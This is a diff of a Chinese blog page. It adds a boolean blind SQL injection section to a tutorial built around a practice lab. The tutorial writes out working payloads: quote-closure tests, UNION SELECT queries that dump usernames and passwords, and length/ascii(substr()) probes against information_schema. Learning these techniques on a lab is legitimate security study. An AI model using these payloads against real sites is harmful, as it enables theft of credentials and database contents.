@@ -40,8 +40,9 @@
 <meta property="og:image" content="https://muxiahuo.github.io/images/sql/sql1-%E7%88%86%E8%A1%A82.png">
 <meta property="og:image" content="https://muxiahuo.github.io/images/sql/sql1-%E7%88%86%E5%88%97.png">
 <meta property="og:image" content="https://muxiahuo.github.io/images/sql/sql1-%E7%88%86%E5%AD%97%E6%AE%B5.png">
+<meta property="og:image" content="https://muxiahuo.github.io/images/sql/sql5-length">
 <meta property="article:published_time" content="2024-07-27T11:38:08.000Z">
-<meta property="article:modified_time" content="2024-07-27T14:02:30.192Z">
+<meta property="article:modified_time" content="2024-07-28T13:51:34.625Z">
 <meta property="article:author" content="muxiahuo">
 <meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
@@ -128,7 +129,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80"><span class="nav-number">2.</span> <span class="nav-text">sql注入基础</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">2.1.</span> <span class="nav-text">判断注入点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="nav-number">2.2.</span> <span class="nav-text">判断闭合方式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">联合注入</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80"><span class="nav-number">2.</span> <span class="nav-text">sql注入基础</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">2.1.</span> <span class="nav-text">判断注入点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="nav-number">2.2.</span> <span class="nav-text">判断闭合方式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">联合注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.</span> <span class="nav-text">布尔盲注</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -209,9 +210,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2024-07-27 19:38:08 / 修改时间：22:02:30" itemprop="dateCreated datePublished" datetime="2024-07-27T19:38:08+08:00">2024-07-27</time>
+      <time title="创建时间：2024-07-27 19:38:08" itemprop="dateCreated datePublished" datetime="2024-07-27T19:38:08+08:00">2024-07-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-07-28 21:51:34" itemprop="dateModified" datetime="2024-07-28T21:51:34+08:00">2024-07-28</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -237,14 +244,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>1.9k</span>
+      <span>3.7k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>2 分钟</span>
+      <span>3 分钟</span>
     </span>
 </div>
 
@@ -258,8 +265,8 @@
     <div class="post-body" itemprop="articleBody"><p>&emsp;&emsp; 当用户输入账号和密码的时候，web应用会向后台数据库进行一个匹配，如果账号密码正确就会登入。而这个数据库例如MySQL,Oracle等一系列用的语句叫做sql语句，那么我们在传数据的时候，使用sql语句上传就会改变一个原有的结构，从而获取或修改数据库中的数据，而这个，就叫做sql注入。</p>
 <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>&emsp;&emsp;那么在做sql注入的时候，建议先看一下sql语句的基础语法，懂得基础才能理解得更加深刻,OK，在学这个之前，我们要搭配着靶场去使用，实践出来的效果更佳。点击<a target="_blank" rel="noopener" href="https://blog.csdn.net/Joker_Dgh/article/details/123913722">靶场环境搭建</a>,当做一个游戏去玩，通关即为胜利（注意php版本要选择5.x版本）</p>
 <h3 id="sql注入基础"><a href="#sql注入基础" class="headerlink" title="sql注入基础"></a>sql注入基础</h3><p>&emsp;&emsp;我们就直接讲思路什么的了，语法基础和逻辑自行去b站了解。</p>
-<h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><p>&emsp;&emsp;注入点分为数字型和字符型（输入字符默认为字符型）。两者的判断方式可以用id&#x3D;2-1来测试，<font color=blue>如果是数字型的，回显的样式应该是id&#x3D;1的情况，如果是字符型的，回显的样式应该是id&#x3D;2的情况。</font><br><img data-src="/images/sql/sql1-1.png" alt="sql1-1"><br>&emsp;&emsp;这是id为1时的name和password<br><img data-src="/images/sql/sql1-2.png" alt="sql1-2"><br>&emsp;&emsp;这是id为2时的name和password<br><img data-src="/images/sql/sql1-2-1.png" alt="sql1-2-1"><br>&emsp;&emsp;这是id为2-1的name和password，很明显，和2的情况是一样的，所以这是字符型。</p>
-<h4 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="判断闭合方式"></a>判断闭合方式</h4><p>&emsp;&emsp;根据语法，既然我们要重新构造一个语句，我们就得把后面的原本语句注释掉，因此我们数字后面需要添加闭合符，语句结尾需要添加注释符。闭合方式有<br><img data-src="/images/sql/%E6%95%B0%E5%80%BC%E9%97%AD%E5%90%88.png" alt="数值闭合"><br><img data-src="/images/sql/%E5%AD%97%E7%AC%A6%E9%97%AD%E5%90%88.png" alt="字符闭合"><br>&emsp;&emsp;然而注释符目前只找到–+(– q),#,%23这三种，判断的方法也很简单，如果<font color=red>所使用的闭合方式结果一样，那么说明不是该闭合方式。反之就是</font>打个比方，如果输入1”and 1&#x3D;1– q 和 1”and 1&#x3D;2 –q 两次的回显结果一样，说明闭合方式不是双引号，其他同理。原理就不用多讲了吧，如果真是闭合符的话，and后面一真一假，后者肯定报错。<br><img data-src="/images/sql/and1=1.png" alt="and1=1"><br><img data-src="/images/sql/and1=2.png" alt="and1=2"><br>&emsp;&emsp;回显不一样，闭合符号为’（可以试试双引号是否回显是一样）</p>
+<h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><p>&emsp;&emsp;注入点分为数字型和字符型（输入字符默认为字符型）。两者的判断方式可以<font color=blue>用id&#x3D;2-1来测试，如果是数字型的，回显的样式应该是id&#x3D;1的情况，如果是字符型的，回显的样式应该是id&#x3D;2的情况。</font><br><img data-src="/images/sql/sql1-1.png" alt="sql1-1"><br>&emsp;&emsp;这是id为1时的name和password<br><img data-src="/images/sql/sql1-2.png" alt="sql1-2"><br>&emsp;&emsp;这是id为2时的name和password<br><img data-src="/images/sql/sql1-2-1.png" alt="sql1-2-1"><br>&emsp;&emsp;这是id为2-1的name和password，很明显，和2的情况是一样的，所以这是字符型。</p>
+<h4 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="判断闭合方式"></a>判断闭合方式</h4><p>&emsp;&emsp;如果是字符型的话，根据语法，既然我们要重新构造一个语句，我们就得把后面的原本语句注释掉，因此我们数值后面需要添加闭合符，语句结尾需要添加注释符。闭合方式有<br><img data-src="/images/sql/%E6%95%B0%E5%80%BC%E9%97%AD%E5%90%88.png" alt="数值闭合"><br><img data-src="/images/sql/%E5%AD%97%E7%AC%A6%E9%97%AD%E5%90%88.png" alt="字符闭合"><br>&emsp;&emsp;然而注释符目前只找到–+(– q),#,%23这三种，判断的方法也很简单，如果<font color=red>所使用的闭合方式结果一样，那么说明不是该闭合方式。反之就是(同时还应判断是否需要添加括号)</font>打个比方，如果输入1”and 1&#x3D;1– q 和 1”and 1&#x3D;2 –q 两次的回显结果一样，说明闭合方式不是双引号，其他同理。原理就不用多讲了吧，如果真是闭合符的话，and后面一真一假，后者肯定报错。<br><img data-src="/images/sql/and1=1.png" alt="and1=1"><br><img data-src="/images/sql/and1=2.png" alt="and1=2"><br>&emsp;&emsp;回显不一样，闭合符号为’（可以试试双引号是否回显是一样）</p>
 <h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>&emsp;&emsp;ok啊，知道闭合方式和注释符之后，我们就可以往期间穿插语句了，那么我们就要学习sql注入的第一步联合注入。<br>&emsp;&emsp;第一步:order by X判断列数，X递增往上加，<font color=blue>如果报错就是超过列数，显示正常就是没有超出，就继续往上加，直到报错退回来。</font><br><img data-src="/images/sql/orderby.png" alt="orderby"><br>&emsp;&emsp;可以看到4报错了，我们就退回来，说明列数只有三列。</p>
 <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 <p>&emsp;&emsp;第二步:union select X判断显示位，先输入1,2,3……看页面回显，能回显的我们就可以再改成语句。当然做这一步的时候，我们需要让前面数据库查询不到，从而列举出后面的列。通常改为负数就可。<br><img data-src="/images/sql/select.png" alt="select"><br>&emsp;&emsp;可以看到2，3被回显出来，因此可以在2，3的位置插入语句。</p>
@@ -273,6 +280,12 @@
 <p>&emsp;&emsp;爆字段，直接查询你要想要看的数据，例如有flag的话，就可以直接查了。<br><img data-src="/images/sql/sql1-%E7%88%86%E5%AD%97%E6%AE%B5.png" alt="sql1-爆字段"></p>
 <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">-1</span>&#x27; union select <span class="number">1</span>,<span class="number">2</span>,group_concat(username ,<span class="built_in">id</span> , password) <span class="keyword">from</span> users<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 <p>&emsp;&emsp; * from table_name也可以全部列出来。</p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>&emsp;&emsp;学会了联合注入的方法后，前四关无压力，第五关测试的时候发现查询不到结果，像是这种的，我们可以使用布尔盲注，区别就是盲注不是返回查询到的结果，而只是返回查询是否成功，即<font color=red>返回查询语句的布尔值</font>,也就是真和假的判断。因为我们对内部数据库的信息了解甚少，所以盲注没有固定的公式，需要进行一定的修改。大致思路是这样的:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">爆库名长度</span><br><span class="line">根据库名长度爆库名</span><br><span class="line">对当前库爆表数量</span><br><span class="line">根据库名和表数量爆表名长度</span><br><span class="line">根据表名长度爆表名</span><br><span class="line">对表爆列数量</span><br><span class="line">根据表名和列数量爆列名长度</span><br><span class="line">根据列名长度爆列名</span><br><span class="line">根据列名爆数据值</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;总结来说就是跟上面差不多的，爆库，爆表，爆列，爆字段。只不过这个更加细节一点，用的方法也不一样。常用函数<code>substr(str,from,length)</code>返回从下标为from截取长度为length的str子串。其中，<font color=black>首字符下标为1</font>,<code>length(str)</code>返回str串长度。<br>&emsp;&emsp;大致步骤如下:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1&#x27;and length((select database()))&gt;9--+</span><br><span class="line"><span class="comment">#大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4</span></span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and ascii(substr((select database()),1,1))=115--+</span><br><span class="line"><span class="comment">#substr(&quot;78909&quot;,1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and length((select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=database()))&gt;13--+</span><br><span class="line">判断所有表名字符长度。</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and ascii(substr((select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=database()),1,1))&gt;99--+</span><br><span class="line">逐一判断表名</span><br><span class="line"> </span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and length((select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_schema</span>=database() <span class="keyword">and</span> <span class="attribute">table_name</span>=<span class="string">&#x27;users&#x27;</span>))&gt;20--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and ascii(substr((select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_schema</span>=database() <span class="keyword">and</span> <span class="attribute">table_name</span>=<span class="string">&#x27;users&#x27;</span>),1,1))&gt;99--+</span><br><span class="line">逐一判断字段名。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">?<span class="attribute">id</span>=1&#x27; <span class="keyword">and</span> length((select group_concat(username,password) <span class="keyword">from</span> users))&gt;109--+</span><br><span class="line">判断字段内容长度</span><br><span class="line">?<span class="attribute">id</span>=1&#x27; <span class="keyword">and</span> ascii(substr((select group_concat(username,password) <span class="keyword">from</span> users),1,1))&gt;50--+</span><br><span class="line">逐一检测内容。</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;要根据注释去修改数值和属性。（建议手打和尝试修改后的变化，更加有印象）<font color=red>注:这是闭合符的判断还是和前面的一样。</font><br>&emsp;&emsp;这里是用等于号测试的，<font color=blue>细节1:先测试1&#x3D;1为真的回显，再看length执行的时候为真的页面，这里等于8是说明数据库的长度为8</font><br><img data-src="/images/sql/sql5-length" alt="sql5-length"></p>
+<p>&emsp;&emsp;得出来长度后，我们就可以用ascii码去遍历一下，人工是不是很麻烦，拜托，咱们是计算机，要用编程~</p>
 
     </div>
 
@@ -324,13 +337,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">33k</span>
+    <span title="站点总字数">35k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">30 分钟</span>
+    <span title="站点阅读时长">31 分钟</span>
   </span>
 </div>
 <div class="busuanzi-count">
